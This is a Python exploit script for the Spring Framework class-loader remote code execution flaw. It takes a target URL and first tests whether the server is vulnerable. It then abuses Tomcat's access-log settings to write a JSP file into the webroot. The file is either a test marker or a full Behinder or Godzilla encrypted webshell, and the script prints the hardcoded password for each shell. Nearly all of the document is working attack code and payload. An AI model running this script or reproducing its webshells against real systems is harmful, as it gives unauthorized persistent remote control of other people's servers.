import time
from urllib.parse import urlparse
import requests
import random
import argparse


def vuln(url):
    rand = random.randint(10000, 99999)
    content = '<%out.println("6right");%>'.replace("%","%{"+sign+"}i")
    data = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": content+"<!--",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": suffix,
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": directory,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
            }
    requests.post(url, headers=headers, data=data)
    print("wait for 6s...")
    time.sleep(6)
    re2 = requests.get("{}/{}{}.jsp".format(location,prefix,rand))
    if "6right" in re2.text:
        print("inject succ , vuln!")
        print("test is {}/{}{}.jsp".format(location,prefix,rand))
    else:
        print("no vuln!")


def webshell(url,shelltype):
    rand = random.randint(10000, 99999)
    if shelltype == 1:
        content = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'.replace("%","%{"+sign+"}i")
    elif shelltype == 2:
        content='<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>'.replace("%","%{"+sign+"}i")
    data = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": content+"<!--",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": suffix,
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": directory,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
            }
    requests.post(url, headers=headers, data=data)
    if shelltype == 1:
        print("rebeyond is {}/{}{}.jsp , password is rebeyond".format(location,prefix,rand))
    elif shelltype == 2:
        print("godzilla is {}/{}{}.jsp , password is pass".format(location,prefix,rand))
    


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Srping Core Rce.')
    parser.add_argument('--url',help='target url',required=True)
    parser.add_argument('--type',help='1 vuln test 2.Behinder shell 3.godzilla shell',type=int,default=1)
    parser.add_argument('--directory',help='target directory',required=False,default="webapps/ROOT")
    parser.add_argument('--filename',help='target filename',required=False,default="inject")
    sign = "6right"
    headers = {sign: "%",
               "Content-Type": "application/x-www-form-urlencoded"
    }
    suffix = ".jsp"
    args = parser.parse_args()
    prefix = args.filename
    directory = args.directory
    location = urlparse(args.url).scheme + "://" + urlparse(args.url).netloc
    if args.type == 1:
        vuln(args.url)
    elif args.type == 2:
        webshell(args.url,1)
    elif args.type == 3:
        webshell(args.url,2)
    else:
        print("error type!")
